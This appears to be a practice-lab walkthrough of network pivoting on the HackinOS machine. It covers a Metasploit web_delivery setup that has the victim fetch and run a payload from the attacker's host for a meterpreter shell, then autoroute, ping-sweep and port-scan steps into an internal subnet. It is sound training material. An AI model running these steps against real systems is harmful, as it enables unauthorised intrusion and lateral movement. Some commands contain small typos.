Pivoting

Machine to practice on - HackinOS

Machine IP - 192.168.43.232

First, I gain access to the machine, using a netcat listener

Now,i check the IP Address,using 'ifconfig'
The address of the machine - 172.18.0.3

We then power up msfconsole and run the exploit/multi/script/web_delivery

set LHOST 192.168.43.205
set LPORT 1234
exploit                          - Image P1

We get a python code to run. We copy-paste and run it on the victim machine.       - Image P2

Glancing back, we get a shell on meterpreter
Running 'ifconfig',we get that IP = 172.18.0.3  -Image P3

(We observe 2 networks - one is localhost and another is the host's network subnet (172.18.0.0/24)

Our objective - Since we gained a shell on the victim machine, as well as a meterpreter shell, now,let's run the autoroute exploit to break into this subnet

Now 'background' this session - background
Now,we need to take the /post/multi/manage/autoroute
set session 1   <-Session in the background,will be used to pivot into this subnet network

exploit 

The subnet will be added to the routing table automatically

Now, we use  post/multi/gather/ping_sweep,to sweep the subnet for hosts
set RHOSTS 172.18.0.0.-255  - We scan the entire list of hosts 
set session 1
exploit

Will get the list of active and alive hosts

Now,we need to scan ports, so we use auxiliary/scanner/portscan/tcp

set RHOSTS <IP>  Either xxx.xx.xx.0-last octet or scan each IP Address individually

set threads 10
exploit

We get the open ports, find the port that interests you.

Now, just background if possible and type 'shell' into the meterpreter prompt

or

From your root prompt in the rooted machine, target the service on the hosts that you found

If you want to access port 3306 on IP=172.18.0.3,

mysql -u "username" -h 172.18.0.3 -p "password'

or


mysql -u "username" -h 172.18.0.3 -p
